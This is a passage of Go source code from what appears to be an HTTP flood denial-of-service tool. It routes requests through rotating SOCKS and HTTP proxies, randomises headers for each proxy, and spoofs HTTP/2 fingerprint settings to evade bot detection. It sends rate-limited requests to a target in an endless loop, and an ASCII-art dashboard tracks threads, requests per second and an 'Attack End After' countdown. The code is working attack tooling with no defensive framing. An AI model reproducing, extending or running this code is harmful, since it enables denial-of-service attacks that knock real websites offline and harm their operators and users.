		transport = &http.Transport{
			Dial:            dialSocksProxy,
			TLSClientConfig: tlsConfig,
		}
	} else {
		proxyURL, err := url.Parse(proxy)
		if err != nil {
			// fmt.Println("Error parsing proxy URL:", err)
			return
		}
		transport = &http.Transport{
			Proxy:           http.ProxyURL(proxyURL),
			TLSClientConfig: tlsConfig,
		}
	}

	if httpMode != "1" {
		transport_http2, err := http2.ConfigureTransports(transport)
		if err != nil {
			return
		}

		transport.MaxIdleConns = 0
		transport.MaxIdleConnsPerHost = 0
		transport_http2.Settings = settingsFrame
		transport_http2.SettingsOrder = settingsFrameOrder
		transport_http2.PseudoHeaderOrder = pseudoHeaderOrder
		transport_http2.ConnectionFlow = connectionFlow
		transport.H2transport = transport_http2
	}

	var jar http.CookieJar
	if useJar {
		jar, err = cookiejar.New(nil)
		if err != nil {
			// fmt.Printf("failed to create cookie jar: %v\n", err)
			return
		}
	}

	client := &http.Client{
		Timeout:   5 * time.Second,
		Transport: transport,
	}

	if redirect {
		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
			if len(via) >= 10 {
				return http.ErrUseLastResponse
			}
			if debug {
				log.Printf("Redirect %s", req.URL.String())
			}
			return nil
		}
	}

	 proxyMapMutex.Lock()
	 header, exists := proxyUserAgentMap[proxy]
	 if !exists {
		 header = randomHeader(proxy)
		 proxyUserAgentMap[proxy] = header
	 }
	 proxyMapMutex.Unlock()

	currentPath := getCurrentPath()
	fullTarget := target + currentPath

	req, err := http.NewRequest(reqmethod, fullTarget, nil)
	if err != nil {
		updateErrorCounters(err)
		return
	}

	 req.Header = header

	if customCookie != "" {
		processedCookie := processCustomCookie(customCookie)
		req.Header.Set("Cookie", processedCookie)
	}

	resp, err := client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if parsed {
		parseCookies(resp)
		if jar != nil {
			u, err := url.Parse(target)
			if err == nil {
				jar.SetCookies(u, resp.Cookies())
			}
		}
	}

	if test {
		body, _ := io.ReadAll(resp.Body)
		fmt.Printf(": %s\n", string(body))
	}
	
	atomic.AddInt32(&connections, 1)
	executeRequestsWithRateLimit(client, req, rps)
}

func executeRequestsWithRateLimit(client *http.Client, req *http.Request, rps float64) {
	rateLimit := time.NewTicker(time.Second / time.Duration(rps))
	defer rateLimit.Stop()

	for {
		select {
		case <-rateLimit.C:
			delayrandom()
			resp, err := client.Do(req)
			if err != nil {
				updateErrorCounters(err)
				continue
			}
			resp.Body.Close()
			updateStatusMap(resp.StatusCode)
		}
	}
}

func updateErrorCounters(err error) {
	statusMutex.Lock()
	defer statusMutex.Unlock()

	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		timeoutCount++
	}
}

func updateStatusMap(statusCode int) {
	statusMutex.Lock()
	defer statusMutex.Unlock()
	statusMap[statusCode]++
}

func CPU() (float64, error) {
	percentages, err := cpu.Percent(0, false)
	if err != nil {
		return 0, err
	}
	return percentages[0], nil
}

func MEM() (float64, error) {
	vmStat, err := mem.VirtualMemory()
	if err != nil {
		return 0, err
	}
	return vmStat.UsedPercent, nil
}

func printStatuses() {
	startTime := time.Now()
	totalRequests := 0

	for debug {
		time.Sleep(time.Second)
		statusMutex.Lock()

		fmt.Print("\033[H\033[2J")
		fmt.Println(`	 ⣿⣿⣷⡦⠀⠀⠀⠀⢰⣿⣿⣷⠀⠀⠀⠀⠀⠀ ⠀⠃⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣆⠀⠀⠀⣾⣿⣿⣿⣷⠄⠀⠰⠤⣀⠀⠀⣴⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠃⢺⣿⣿⣿⣿⡄⠀⠀⣿⣿⢿⣿⣿⣦⣦⣦⣶⣼⣭⣼⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣷⡆⠂⣿⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢙⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⣿⠟⠻⣿⣿⣿⣿⡿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⢿⣿⣿⣿⣿⡄⣿⣿⣿⣿⣿⣿⡀⢀⣿⣿⣿⣿⠀⢸⣿⣿⠅⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡀⣠⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡔⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣻⣿⣿⣿⣿⣿⡟⠋⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠙⢿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠿⢿⡿⠛⠋⠁⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⡟⠃⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀
⠀⠜⢠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣦⠄⣠⠀
⠠⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠛⣿⣿⣿⡿⠏⠀⠀⠀⠀⠀⠀⢳⣾⣿⣿⣿⣿⣿⣿⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿`)
		fmt.Println("> Version: v0.9")
		fmt.Println("> Request Method:", reqmethod)
		fmt.Println("> Target:", target)
		fmt.Println("> Time:", duration)
		fmt.Println("> Threads:", threads)
		fmt.Println("> Ratelimit:", rps)

		currentTime := time.Now()
		elapsedTime := currentTime.Sub(startTime).Seconds()
		averageRPS := float64(totalRequests) / elapsedTime
		remainingTime := float64(duration) - elapsedTime

		if remainingTime < 0 {
			remainingTime = 0
		}

		var codes []int
		for code := range statusMap {
			codes = append(codes, code)
		}
		sort.Ints(codes)

		cpuUsage, err := CPU()
		if err != nil {
			cpuUsage = 0
		}

		memUsage, err := MEM()
		if err != nil {
			memUsage = 0
		}

		statusString := "Status Codes:"
		for _, code := range codes {
			statusString += fmt.Sprintf(" [%d: %d]", code, statusMap[code])
		}
		statusString += fmt.Sprintf(" [H2_CLOSE: %d]", timeoutCount)
		fmt.Printf("Go routines (threads): %d\n", runtime.NumGoroutine())
		fmt.Printf("Connections: %d\n", connections)
		fmt.Printf("%s\n", statusString)
		fmt.Printf("CPU: %.2f%%, MEM: %.2f%%\n", cpuUsage, memUsage)
		fmt.Printf("Average Requests: %.2f Per Second\n", averageRPS)
		fmt.Printf("Attack End After: %.f Seconds\n", remainingTime)

		for _, count := range statusMap {
			totalRequests += count
		}

		statusMap = make(map[int]int)
		timeoutCount = 0
		statusMutex.Unlock()
	}
}